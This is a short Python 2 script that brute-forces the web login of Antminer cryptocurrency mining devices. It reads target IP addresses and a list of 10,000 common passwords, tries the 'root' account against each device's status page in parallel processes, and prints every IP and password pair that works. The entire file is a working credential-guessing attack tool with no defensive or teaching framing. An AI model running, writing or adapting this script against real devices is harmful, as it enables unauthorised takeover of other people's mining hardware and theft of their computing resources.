#!/usr/bin/env python
#coding=utf-8
import urllib2
import time
import socket

from multiprocessing import Process

def get_auth(ip, username, password):
	url_top = 'http://{}'.format(ip)
	realm="antMiner Configuration"
	auth = urllib2.HTTPDigestAuthHandler()
	auth.add_password(realm,url_top,username,password)
	return auth

def get_info(ip, auth):
	url_status = 'http://{}/cgi-bin/minerStatus.cgi'.format(ip)

	opener = urllib2.build_opener(auth)
	urllib2.install_opener(opener)
	res_data = urllib2.urlopen(url_status).read()
	return res_data

def read_file(file_name):
	with open(file_name, 'r') as f:
		content = f.read()
	con_list = []
	for i in content.splitlines():
		con_list.append(i)
	return con_list

def attack(ip, username, password):
	try:
		auth = get_auth(ip, username, password)
		get_info(ip, auth)
		print ip, username, password
	except Exception as e:
		pass

def multi_attack(ips, username, passwords):
	for ip in ips:
		for password in passwords:
			p = Process(target = attack, args = (ip, username, password,))
			p.start()

def main():
	username = 'root'
	passwords = read_file('10k_most_common.txt')
	ips = read_file('ip.txt')
	print '[*]Attacking...'
	# multi_attack(ips, username, passwords)
	for i in range(0, len(ips), 10):
		ips_part = ips[i:i+10]
		for j in range(0, len(passwords), 20):
			passwords_part = passwords[j:j+20]
			multi_attack(ips_part, username, passwords_part)
			time.sleep(5)


if __name__ == '__main__':
	main()
